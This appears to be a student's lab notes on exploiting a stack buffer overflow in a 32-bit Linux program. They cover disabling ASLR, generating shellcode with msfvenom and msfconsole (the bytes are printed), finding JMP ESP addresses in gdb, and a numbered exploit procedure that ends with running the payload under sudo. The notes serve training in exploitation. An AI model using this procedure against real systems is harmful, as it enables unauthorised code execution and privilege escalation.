heap - memroy allocated and deallocated 
stack - continious section of memory used for passing args 
regsiters - storage elements 
stack pointer - contains address of next available space on stack
base pointer - base of stack
function - code seperated for the main program, used to replace code/ modify 
shellcode - code that is executed oce an exploit successfully used against a vulnerability

dsiabling aslr
sudo sysctl -w kernal.randomize_va_space=0

msfconsole--
use payload/linux/x86/exec
set CMD whoami 
generate -b "\x00\x20\x0a\x0d" -f python   ("\x00" should work just fine)

output should generate:
buf =  b""
buf += b"\xbd\x91\x71\x7d\x11\xd9\xc4\xd9\x74\x24\xf4\x5a"                       (if exploit ever fails with "segmentation fault or 
buf += b"\x2b\xc9\xb1\x0b\x83\xea\xfc\x31\x6a\x10\x03\x6a"                        "illegal instruction", regenerate shellcode in this 
buf += b"\x10\x73\x84\x17\x1a\x2b\xfe\xba\x7a\xa3\x2d\x58"                        step and copy and pst into your script)
buf += b"\x0a\xd4\x46\xb1\x7f\x72\x97\xa5\x50\xe0\xfe\x5b"
buf += b"\x26\x07\x52\x4c\x3f\xc7\x53\x8c\x37\xaf\x3c\xed"
buf += b"\xda\x46\xc3\xba\x77\x11\x22\x89\xf8"
                                           
back in gdb-
student@lin-ops:~/Downloads$ env - gdb /Downloads/func
load file 
(gdb) unset env LINES
(gdb) unset env COLUMNS 
(gdb) run
(gdb) info proc map
process 20592
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/student/Downloads/func
	0x56556000 0x56557000     0x1000        0x0 /home/student/Downloads/func
	0x56557000 0x56558000     0x1000     0x1000 /home/student/Downloads/func
	0x56558000 0x5657a000    0x22000        0x0 [heap]
	0xf7de1000 0xf7fb3000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fb3000 0xf7fb4000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb4000 0xf7fb6000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fb6000 0xf7fb7000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fb7000 0xf7fba000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4

0xf7de3b59
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
0xf7f64aff
0xf7f64d6f
0xf7f64f97
0xf7f650cf
0xf7f65343
0xf7f65497
0xf7f655cf
0xf7f65777
0xf7f659ef
0xf7f662eb
0xf7f6649b
0xf7f66533
0xf7f66633
0xf7f66b3b
0xf7f66b8b
0xf7f66cdb
0xf7f67033
0xf7f67203
0xf7f67293
0xf7f676db
0xf7f677a3
0xf7f67843
0xf7f67ecb
0xf7f67ee3
0xf7f67f9b
0xf7f68043
0xf7f683eb
0xf7f6863b
0xf7f6870b
0xf7f68733
0xf7f687bb



#### BUFFER OVERFLOW PROCESS ####
0. Identify buffer overflowable program
    a. Can you get a "segmentation fault"
    b. Open it up in peda. Can you identify a buffer-overflowable function? (print, gets, puts, etc)
    c. sudo -l
1. Run the program and observe how it works.
    a. Does it take user input? Parameter?
    b. Can it be overfowed?
2. Find your offset.
    a. open prgrammin gdb 
    b. put wiremask.eu pattern generator as input to get register then use register to find offset 
    c. use 4 "B"s in your EIP, do you have positive control
3. Find your EIP
  
    b. show env
    c. unset env LINES
      unset env COLUMNS
    d. run the program and overflow it
    e. info proc map
    f. grab after the heap, before the stack
    g. find /b 0x..., 0x..., 0xff, 0xe4
4. Put EIP in REVERSE ENDIAN order
    a. 0xf7f610ab should be \xab\x10\xf6\xf7
5. Generate shellcode
    a. msfvenom -p linux/x86/exec CMD=whoami -b "\x00" -f python
    b. OR, use msfconsole
6. Ensure print statement contains buff + eip + nop + shellcode
7. Run program outside of GDB with input of python script
    a. sudo ./func <<< $(python buffer.py)
~

